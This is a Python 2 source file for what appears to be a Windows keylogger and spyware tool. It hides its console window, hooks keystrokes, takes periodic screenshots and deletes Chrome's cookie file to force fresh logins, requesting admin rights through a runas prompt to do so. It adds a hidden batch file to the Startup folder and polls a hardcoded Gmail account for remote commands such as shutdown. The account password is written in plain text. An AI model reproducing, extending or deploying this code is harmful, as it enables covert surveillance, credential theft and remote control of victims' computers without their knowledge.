import time
import platform
import os
from KeyCatcher import KeyCatcher
import pythoncom
from multiprocessing import Process
import win32console
import win32gui
import Email
from uuid import getnode as get_mac
import DataInfo
import getpass
import ctypes
import sys
import uptime
import win32api
import win32con

USER_NAME = getpass.getuser()
PLATFORM = platform.system()
DATA_INFO = DataInfo.DataInfo()
MAC_ADDRESS = str(get_mac())
CURRENT_PATH = os.path.dirname(os.path.realpath(__file__))
MY_MAIL = "firstmanage1@gmail.com"
MY_PASSWORD = "roihamelech"
TARGET = MY_MAIL
WAS_READ_FILE = "was_read.log"


def get_time_since_uptime():
    return uptime.uptime()


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    if not os.path.exists(bat_path + '\\' + "open.bat") and not os.path.exists(bat_path + '\\' + ".open.bat"):
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)
        # make file hidden
        if PLATFORM == "Windows":
            win32api.SetFileAttributes(bat_path + '\\' + "open.bat", win32con.FILE_ATTRIBUTE_HIDDEN)
        elif PLATFORM == "Linux":
            os.rename(bat_path + '\\' + "open.bat", bat_path + '\\' + ".open.bat")


def run_as_admin(argv=None, debug=False):
    shell32 = ctypes.windll.shell32
    if argv is None and shell32.IsUserAnAdmin():
        return True

    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        # Support pyinstaller wrapped program.
        arguments = map(unicode, argv[1:])
    else:
        arguments = map(unicode, argv)
    argument_line = u' '.join(arguments)
    executable = unicode(sys.executable)
    if debug:
        print 'Command line: ', executable, argument_line
    ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None


def delete_chrome_cookie_file():
    try:
        os.remove("C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies" % USER_NAME)
        return True
    except WindowsError:
        return False


def delete_chrome_cookie_file_with_admin():
    was_deleted = delete_chrome_cookie_file()
    while not was_deleted:
        time.sleep(5)
        print was_deleted
        was_deleted = delete_chrome_cookie_file()
    DATA_INFO.new_data_file("cookies.log")


def shutdown():
    os.system('shutdown -s')
    return


def hide_console():
    """
    hide the console window
    """
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return


def main():
    hide_console()
    # choose dir for the keyloger to save files in
    key_logger = KeyCatcher(CURRENT_PATH + "\\data")
    key_logger.set_key_hook()
    if not DATA_INFO.is_file("cookies.log"):
        if not delete_chrome_cookie_file():
            is_admin = run_as_admin()
            print is_admin
            if is_admin is None or True:
                delete_cookies_process = Process(target=delete_chrome_cookie_file_with_admin)
                delete_cookies_process.start()
    DATA_INFO.new_data_file(WAS_READ_FILE)
    pictures_process = Process(target=take_pics_forever, args=(key_logger,))
    pictures_process.start()
    commands_process = Process(target=get_mail_commends_loop)
    commands_process.start()
    add_to_startup()
    wait_for_messages_forever()


def take_pics_forever(key_logger):
    while True:
        time.sleep(10)
        if is_time_for_pic():
            key_logger.take_screen_shot()


def is_time_for_pic():
    # TODO: add scapy, sniff and check if a secured website was asked
    return True


def wait_for_messages_forever():
    pythoncom.PumpMessages()


def get_mail_commends_loop():
    while True:
        get_mail_commends()


def receive_messages_multiprocessing():
    # set process
    p = Process(target=wait_for_messages_forever)
    p.start()
    return


def handle_commands(content_lines):
    if "shutdown" in content_lines[5]:
        shutdown()


def get_mail_commends():
    e = Email.Email(MY_MAIL, MY_PASSWORD)
    e.login()
    mails = e.get_all_mail()[::-1]
    for i, mail in enumerate(mails):
        content = e.get_mail_content(mail)
        content_lines = content.split("\n")
        print content_lines[5]
        if "<firstmanage1@gmail.com>" in content_lines[6]:
            if "command" in content_lines[5] \
                    and MAC_ADDRESS in content_lines[5]:
                e.delete_mail(mail)
                handle_commands(content_lines)
            elif "all" in content_lines[5] \
                    and "command" in content_lines[5]:
                was_read_content = DATA_INFO.read_file(WAS_READ_FILE)
                was_read_content = was_read_content.split()
                if str(i) not in was_read_content:
                    DATA_INFO.write_data_file_end(str(i) + " ", WAS_READ_FILE)
                    handle_commands(content_lines)
            elif "mail was cleared" in content_lines[5]:
                DATA_INFO.delete_data_file(WAS_READ_FILE)


if __name__ == '__main__':
    main()